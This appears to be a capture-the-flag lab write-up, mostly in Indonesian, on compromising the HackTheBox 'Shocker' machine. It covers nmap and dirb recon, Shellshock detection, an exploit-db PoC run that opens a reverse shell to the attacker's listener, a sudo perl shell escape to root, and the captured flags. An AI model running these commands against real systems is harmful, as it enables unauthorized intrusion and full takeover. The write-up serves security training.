---
layout: post
title: "HTB Shocker Writeup"
description: "HTB Shocker Writeup"
comments: true
keywords: "HackTheBox"
---
_Perl, Web, Injection_

# NMAP 


```
#   Nmap 7.91 scan initiated Tue Jul  6 11:17:37 2021 as: nmap -A -v -oN nmap.txt 10.10.10.56
Increasing send delay for 10.10.10.56 from 0 to 5 due to 60 out of 199 dropped probes since last increase.
Nmap scan report for 10.10.10.56
Host is up (0.034s latency). 
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Aggressive OS guesses: Linux 3.12 (95%), Linux 3.13 (95%), Linux 3.2 - 4.9 (95%), Linux 3.8 - 3.11 (95%), Linux 4.8 (95%), Linux 4.4 (95%), Linux 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), Linux 4.2 (95%)
No exact OS matches for host (test conditions non-ideal).
Uptime guess: 0.098 days (since Tue Jul  6 08:56:35 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   32.29 ms 10.10.14.1
2   32.37 ms 10.10.10.56

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jul  6 11:18:09 2021 -- 1 IP address (1 host up) scanned in 31.93 seconds
```
# DIRB
```
┌──(kali㉿kali)-[~/htb/shocker]
└─$ dirb http://10.10.10.56:80/ /usr/share/seclists/Discovery/Web-Content/common.txt                          127 ⨯

-----------------
DIRB v2.22      
By The Dark Raver
-----------------

START_TIME: Wed Jul  7 04:20:46 2021
URL_BASE: http://10.10.10.56:80/
WORDLIST_FILES: /usr/share/seclists/Discovery/Web-Content/common.txt

-----------------

GENERATED WORDS: 4685                                                          

---- Scanning URL: http://10.10.10.56:80/ ----
+ http://10.10.10.56:80/cgi-bin/ (CODE:403|SIZE:294)                                                               
+ http://10.10.10.56:80/index.html (CODE:200|SIZE:137)                                                             
+ http://10.10.10.56:80/server-status (CODE:403|SIZE:299)                                                          
                                                                                                                   
-----------------
END_TIME: Wed Jul  7 04:23:20 2021
DOWNLOADED: 4685 - FOUND: 3
```
Ada folder cgi-bin yang mencurigakan. Lakukan lagi scan pada /cgi-bin 

# NMAP:cgi/bin
```
┌──(kali㉿kali)-[~/htb/shocker]
└─$ cat 2nmap.txt    
# Nmap 7.91 scan initiated Wed Jul  7 07:25:53 2021 as: nmap -A -v --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls -oN 2nmap.txt 10.10.10.56
Nmap scan report for 10.10.10.56
Host is up (0.070s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       http://seclists.org/oss-sec/2014/q3/685
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|_      http://www.openwall.com/lists/oss-security/2014/09/24/10
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul  7 07:26:06 2021 -- 1 IP address (1 host up) scanned in 12.37 seconds
                                                                                                      
```


Ada file user.sh, jika dibuka di browser bisa didownload dan berikut adalah isinya
```
Content-Type: text/plain

Just an uptime test script

 11:34:00 up  2:40,  0 users,  load average: 0.02, 0.06, 0.01
```
Isinya ternyata mirip dengan command uptime biasa di linux.  

# VULNERABILITY - SHELLSHOCK
Selain itu tidak ada informasi lagi yang bisa didapatkan. Lalu saya berpikir sepertinya vulnerabilitynya memang di apachenya. Setelah googling "apache cgi-bin vuln" saya menemukan vulnerability ini : https://www.exploit-db.com/exploits/34900
 
"Shellshock, also known as Bashdoor,[1] is a family of security bugs[2] in the Unix Bash shell, the first of which was disclosed on 24 September 2014. Shellshock could enable an attacker to cause Bash to execute arbitrary commands and gain unauthorized access[3] to many Internet-facing services, such as web servers, that use Bash to process requests. " -wikipedia
  
Untuk memverifikasi bahwa ini memang shellshock gw coba jalanin NSE script nmap untuk meriksa:
 ```
# Nmap 7.91 scan initiated Wed Jul  7 07:25:53 2021 as: nmap -A -v --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls -oN 2nmap.txt 10.10.10.56
Nmap scan report for 10.10.10.56
Host is up (0.070s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-shellshock: 
|   VULNERABLE:
|   HTTP Shellshock vulnerability
|     State: VULNERABLE (Exploitable)
|     IDs:  CVE:CVE-2014-6271
|       This web application might be affected by the vulnerability known
|       as Shellshock. It seems the server is executing commands injected
|       via malicious HTTP headers.
|             
|     Disclosure date: 2014-09-24
|     References:
|       http://seclists.org/oss-sec/2014/q3/685
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-7169
|_      http://www.openwall.com/lists/oss-security/2014/09/24/10
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Jul  7 07:26:06 2021 -- 1 IP address (1 host up) scanned in 12.37 seconds
```             

Ternyata memang vulnerable ke shellshock. Selanjutnya mari kita exploit.                                                                                    
 
# EXPLOITATION - SHELLSHOCK
Gunakan poc di https://www.exploit-db.com/exploits/34900, lalu jalankan dengan comand berikut : 
 ```
┌──(kali㉿kali)-[~/htb/shocker]
└─$ ./exploit.py payload=reverse rhost=10.10.10.56 lhost=10.10.14.26 lport=45 pages=/cgi-bin/user.sh        1 ⨯ 1 ⚙
[!] Started reverse shell handler
[-] Trying exploit on : /cgi-bin/user.sh
[!] Successfully exploited
[!] Incoming connection from 10.10.10.56
10.10.10.56> ls
user.sh

10.10.10.56> whoami
Shelly
```

# PRIVESC
```
10.10.10.56> sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl

10.10.10.56> 
```
Ketika diperiksa dengan sudo -l ternyata perl bisa dijalankan sebagai root.  Spawn bash menggunakan perl dengan perintah berikut: 
```
10.10.10.56> sudo perl -e 'exec "/bin/sh";'
10.10.10.56> whoami
root
```
# FLAGS
Setelah mendapat root kedua flag bisa didapatkan dengan mudah
 
## User  flag : 
10.10.10.56> cat /home/shelly/user.txt
d967e5805006ca1e927d9d0188e02215

## Root flag:
10.10.10.56> cat /root/root.txt
7724872cf757e82700af2ed2d08b257a  

---
